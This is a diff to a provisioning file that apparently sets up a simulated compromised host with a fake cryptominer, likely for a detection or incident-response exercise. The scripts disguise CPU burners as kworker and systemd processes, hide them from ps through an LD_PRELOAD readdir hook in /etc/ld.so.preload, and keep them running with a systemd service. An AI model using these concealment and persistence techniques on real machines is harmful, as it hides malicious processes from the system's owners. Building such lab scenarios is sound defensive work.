@@ -21,30 +21,38 @@ provision:
       # Create a fake cryptominer that uses CPU
       mkdir -p /dev/shm/.hidden
       
-      # Simple CPU burner using yes command - runs forever
+      # Create CPU burner scripts disguised as system processes
+      # Use bash infinite loops instead of yes
+      cat > /dev/shm/.hidden/kworker << 'KWORKER_EOF'
+      #!/bin/bash
+      while true; do :; done
+      KWORKER_EOF
+      
+      cat > /dev/shm/.hidden/systemd-journal << 'JOURNAL_EOF'
+      #!/bin/bash
+      while true; do :; done
+      JOURNAL_EOF
+      
+      cat > /dev/shm/.hidden/systemd-udevd << 'UDEVD_EOF'
+      #!/bin/bash
+      while true; do :; done
+      UDEVD_EOF
+      
+      chmod +x /dev/shm/.hidden/kworker
+      chmod +x /dev/shm/.hidden/systemd-journal
+      chmod +x /dev/shm/.hidden/systemd-udevd
+      
+      # Main miner script
       cat > /dev/shm/.hidden/xmrig << 'MINER_EOF'
       #!/bin/bash
-      # Burn CPU with multiple yes processes in background
-      nohup yes > /dev/null 2>&1 &
-      nohup yes > /dev/null 2>&1 &
-      nohup yes > /dev/null 2>&1 &
-      # Keep script alive
-      while true; do
-          sleep 3600
-      done
+      # Launch disguised CPU burners
+      /dev/shm/.hidden/kworker &
+      /dev/shm/.hidden/systemd-journal &
+      /dev/shm/.hidden/systemd-udevd &
+      wait
       MINER_EOF
       
       chmod +x /dev/shm/.hidden/xmrig
-      
-      # Backup burner using sha256sum
-      cat > /dev/shm/.hidden/miner-worker << 'WORKER_EOF'
-      #!/bin/bash
-      while true; do
-          dd if=/dev/zero bs=1M count=100 2>/dev/null | sha256sum > /dev/null
-      done
-      WORKER_EOF
-      
-      chmod +x /dev/shm/.hidden/miner-worker
       
       # Create a wrapper that hides the process from ps
       # We'll use a LD_PRELOAD trick to filter readdir
@@ -64,10 +72,10 @@ provision:
           
           struct dirent *dir;
           while ((dir = original_readdir(dirp)) != NULL) {
-              // Hide xmrig, miner-worker, yes, dd, and sha256sum processes
+              // Hide xmrig, miner-worker, and dd processes
+              // Don't hide kworker/systemd processes - they look legitimate
               if (strstr(dir->d_name, "xmrig") != NULL ||
                   strstr(dir->d_name, "miner") != NULL ||
-                  strstr(dir->d_name, "yes") != NULL ||
                   strstr(dir->d_name, "sha256sum") != NULL ||
                   strstr(dir->d_name, "dd") != NULL) {
                   continue;
@@ -89,16 +97,10 @@ provision:
           echo "/usr/lib/aarch64-linux-gnu/libhide.so" >> /etc/ld.so.preload
       fi
       
-      # Start the miner processes directly (not via script)
-      # These will run continuously in the background
-      nohup yes > /dev/null 2>&1 &
-      nohup yes > /dev/null 2>&1 &
-      nohup yes > /dev/null 2>&1 &
-      nohup bash -c 'while true; do dd if=/dev/zero bs=1M count=100 2>/dev/null | sha256sum > /dev/null; done' > /dev/null 2>&1 &
-      
-      # Also start via the script for systemd
-      nohup /dev/shm/.hidden/xmrig > /dev/null 2>&1 &
-      nohup /dev/shm/.hidden/miner-worker > /dev/null 2>&1 &
+      # Start the miner processes directly
+      /dev/shm/.hidden/kworker &
+      /dev/shm/.hidden/systemd-journal &
+      /dev/shm/.hidden/systemd-udevd &
       
       # Add persistence via systemd
       cat > /etc/systemd/system/system-health-monitor.service << 'SYSTEMD_EOF'
@@ -108,7 +110,7 @@ provision:
       
       [Service]
       Type=simple
-      ExecStart=/bin/bash -c 'yes > /dev/null & yes > /dev/null & yes > /dev/null & wait'
+      ExecStart=/dev/shm/.hidden/xmrig
       Restart=always
       RestartSec=5
       
